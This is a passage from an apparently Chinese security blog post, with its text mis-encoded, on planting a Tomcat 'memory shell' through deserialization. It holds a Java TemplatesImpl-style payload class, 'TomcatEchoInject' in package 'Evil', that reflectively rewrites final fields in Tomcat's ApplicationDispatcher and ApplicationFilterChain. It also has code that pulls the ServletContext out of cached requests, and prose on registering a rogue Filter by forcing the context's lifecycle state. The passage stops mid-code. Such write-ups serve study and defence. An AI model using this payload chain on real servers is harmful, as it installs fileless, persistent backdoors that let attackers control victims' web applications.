</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">73
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.logging.Filter;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.logging.LogRecord;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName TomcatEchoInject
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/16 21:48
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> TomcatEchoInject <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> updateFinalField(Class aclass,String filedName){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> field = aclass.<span style="color:#007f7f">getDeclaredField</span>(filedName);
</span></span><span style="display:flex;"><span>            java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> modifiersField = field.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;modifiers&#34;</span>);
</span></span><span style="display:flex;"><span>            modifiersField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>            modifiersField.<span style="color:#007f7f">setInt</span>(field,field.<span style="color:#007f7f">getModifiers</span>() &amp; ~java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Modifier</span>.<span style="color:#007f7f">FINAL</span>);
</span></span><span style="display:flex;"><span>            field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(filedName == <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span>(!field.<span style="color:#007f7f">getBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>)){
</span></span><span style="display:flex;"><span>                    field.<span style="color:#007f7f">setBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span>(field.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>) == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                   field.<span style="color:#007f7f">set</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">new</span> ThreadLocal());
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// ä¿®æ”¹WRAP_SAME_OBJECT å€¼ä¸º true
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#007f7f">// ä¿®æ”¹final çš„å€¼
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            String WRAP_SAME_OBJECT_NAME = <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>;
</span></span><span style="display:flex;"><span>            String lastServicedRequestName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>;
</span></span><span style="display:flex;"><span>            String lastServicedResponseName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedResponse&#34;</span>;
</span></span><span style="display:flex;"><span>            Class&lt;?&gt; applicationDispatcherClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span>);
</span></span><span style="display:flex;"><span>            Class&lt;?&gt; applicationFilterChainClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME);
</span></span><span style="display:flex;"><span>            updateFinalField(applicationFilterChainClass,lastServicedRequestName);
</span></span><span style="display:flex;"><span>            updateFinalField(applicationFilterChainClass,lastServicedResponseName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="æ­¥éª¤äºŒ">æ­¥éª¤äºŒ<a hidden class="anchor" aria-hidden="true" href="#æ­¥éª¤äºŒ">#</a></h4>
<p>å°† request å’Œ response è¿›è¡Œå–å‡ºï¼Œç„¶åæ³¨å…¥æˆ‘ä»¬çš„filterã€‚</p>
<h5 id="è·å¾—servletcontext">è·å¾—ServletContext<a hidden class="anchor" aria-hidden="true" href="#è·å¾—servletcontext">#</a></h5>
<p>é€šè¿‡åå°„è·å¾—<code>lastServicedRequest</code>å˜é‡ï¼Œå› ä¸ºå…¶å­˜å‚¨çš„ç±»å‹æ˜¯<code>ServletRequest</code>ï¼Œå¯ä»¥é€šè¿‡<code>get</code>æ–¹æ³•è·å¾—<code>request</code>ï¼Œä¹‹åé€šè¿‡<code>getServletContext</code>æ–¹æ³•è·å¾—servletContext</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> ServletContext getServletContext() <span style="color:#fff;font-weight:bold">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
</span></span><span style="display:flex;"><span>    ServletRequest servletRequest = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/*shellæ³¨å…¥ï¼Œå‰æéœ€è¦èƒ½æ‹¿åˆ°requestã€responseç­‰*/</span>
</span></span><span style="display:flex;"><span>    Class c = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>    java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> f = c.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>);
</span></span><span style="display:flex;"><span>    f.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>    ThreadLocal threadLocal = (ThreadLocal) f.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//ä¸ä¸ºç©ºåˆ™æ„å‘³ç€ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„å‡†å¤‡å·¥ä½œå·²æˆåŠŸ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (threadLocal != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; threadLocal.<span style="color:#007f7f">get</span>() != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>        servletRequest = (ServletRequest) threadLocal.<span style="color:#007f7f">get</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">assert</span> servletRequest != <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    ServletContext servletContext = servletRequest.<span style="color:#007f7f">getServletContext</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span>(servletContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> servletContext;
</span></span><span style="display:flex;"><span>    }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ³¨å†Œfilter">æ³¨å†ŒFilter<a hidden class="anchor" aria-hidden="true" href="#æ³¨å†Œfilter">#</a></h5>
<p>å…¶å®è¿™é‡Œç›´æ¥æ ¹æ®æˆ‘ä»¬ä¹‹å‰åœ¨<code>Tomcatå†…å­˜é©¬</code>æ–‡ç« é‡Œé¢æåˆ°çš„æ³¨å†ŒFilterå†…å­˜é©¬çš„æ–¹æ³•ä¸€æ ·ï¼Œç›´æ¥åˆå§‹åŒ–æ·»åŠ <code>FilterDef</code>ã€ç„¶åé€šè¿‡<code>StandarContext</code>è·å–FilterConfigsã€æ‰‹åŠ¨æ„é€ FilterConfig,FilterMap,æœ€åä¸€ä¸€æ·»åŠ å³å¯ã€‚</p>
<p>è¿™é‡Œæ ¹æ®å¤§å¸ˆå‚…çš„åšå®¢ï¼Œå­¦ä¹ ä¸€ä¸‹å¦ä¸€æ¡æ³¨å†ŒFilterçš„è·¯çº¿ï¼Œå…¶å®åŸç†éƒ½æ˜¯å¤§åŒå°å¼‚ã€‚</p>
<p><code>ServletContext </code>æä¾›äº†<code>addFilter</code>æ–¹æ³•ï¼Œä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œåˆ†åˆ«æ¥æ”¶å­—ç¬¦ä¸²ç±»å‹çš„ filterName ä»¥åŠ Filter å¯¹è±¡/className å­—ç¬¦ä¸²/Filter å­ç±»çš„ Class å¯¹è±¡ï¼Œæä¾›ä¸åŒåœºæ™¯ä¸‹æ·»åŠ  filter çš„åŠŸèƒ½ï¼Œè¿™äº›æ–¹æ³•å‡è¿”å› <code>FilterRegistration.Dynamic</code> å®é™…ä¸Šå°±æ˜¯ FilterRegistration å¯¹è±¡ï¼Œä¸‰ç§é‡è½½æ–¹æ³•å®é™…ä¸Šéƒ½æ˜¯è°ƒç”¨<code>org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, java.lang.String, javax.servlet.Filter)</code>æ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417134410833.png" alt="image-20230417134410833"  />
</p>
<p>è¿™ä¸ªæ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ª FilterDef å¯¹è±¡ï¼Œå°† filterNameã€filterClassã€filter å¯¹è±¡åˆå§‹åŒ–è¿›å»ï¼Œä½¿ç”¨ StandardContext çš„ <code>addFilterDef</code> æ–¹æ³•å°†åˆ›å»ºçš„ FilterDef å‚¨å­˜åœ¨äº† StandardContext ä¸­çš„ä¸€ä¸ª Hashmap filterDefs ä¸­ï¼Œç„¶å new äº†ä¸€ä¸ª ApplicationFilterRegistration å¯¹è±¡å¹¶ä¸”è¿”å›ã€‚</p>
<p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æ·»åŠ è‡ªå®šä¹‰Filteræœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<p>1ã€å¹¶ä¸”<code>context.getState()</code>åœ¨è¿è¡Œæ—¶è¿”å›çš„stateå·²ç»æ˜¯<code>LifecycleState.STARTED</code>è¡¨ç¤ºç¨‹åºåœ¨è¿è¡Œä¸­ï¼Œå› æ­¤å¦‚æœç›´æ¥æ·»åŠ çš„è¯ï¼Œç¨‹åºä¼šç›´æ¥æŠ›å‡ºé”™è¯¯ï¼š<code>applicationContext.addFilter.ise</code>.</p>
<p>2ã€Filterå†…å­˜é©¬çš„ä¼ é€’æ˜¯é€šè¿‡<code>FilterChain</code>ï¼Œ<code>addFilter</code>æ–¹æ³•å¹¶æ²¡æœ‰å°†æ·»åŠ çš„Filteræ”¾åˆ°FilterChainé“¾ä¸­ï¼Œå› æ­¤å•çº¯è°ƒç”¨è¿™ä¸ªæ–¹æ³•å¹¶ä¸ä¼šå®ç°è‡ªå®šä¹‰çš„Filteræ³¨å†Œã€‚</p>
<h6 id="é—®é¢˜ä¸€">é—®é¢˜ä¸€<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜ä¸€">#</a></h6>
<p>å¯¹äºé—®é¢˜ä¸€ï¼Œæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆ</p>
<p>æ–¹æ³•ä¸€ï¼š</p>
<ul>
<li>æˆ‘ä»¬ç›´æ¥ä¸è€ƒè™‘ä½¿ç”¨<code>org.apache.catalina.core.ApplicationContext#addFilter()</code>è¿™ä¸ªæ–¹æ³•ï¼Œå› ä¸ºå®é™…ä¸Šè¯¥æ–¹æ³•æ˜¯é€šè¿‡<code>standardContext.addFilterDef()</code>æ¥å®ç°æ·»åŠ filterDef,å› æ­¤æˆ‘ä»¬é€šè¿‡åå°„æ„é€ <code>filterDef</code>ï¼Œç„¶åå°è£…ä¸ºä¸€ä¸ª<code>ApplicationFilterRegistration</code>å¯¹è±¡å³å¯ã€‚</li>
<li>å®ç°æ–¹æ³•å’Œä¹‹å‰tomcatå†…å­˜é©¬å­¦åˆ°çš„å·®ä¸å¤šï¼Œå°±ä¸å†èµ˜è¿°ã€‚</li>
</ul>
<p>æ–¹æ³•äºŒï¼š</p>
<ul>
<li>
<p>æˆ‘ä»¬é€šè¿‡åå°„ä¿®æ”¹<code>context</code>å­—æ®µçš„<code>state</code>ï¼Œåœ¨æ·»åŠ filterå‰ï¼Œé€šè¿‡åå°„è®¾ç½®æˆ<code>LifecycleState.STARTING_PREP</code>ï¼Œåœ¨å…¶é¡ºåˆ©æ·»åŠ å®Œæˆåï¼Œå†æŠŠå…¶æ¢å¤æˆ<code>LifecycleState.STARTE</code>ï¼Œè¿™é‡Œå¿…é¡»è¦æ¢å¤ï¼Œè¦ä¸ç„¶ä¼šé€ æˆæœåŠ¡ä¸å¯ç”¨ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
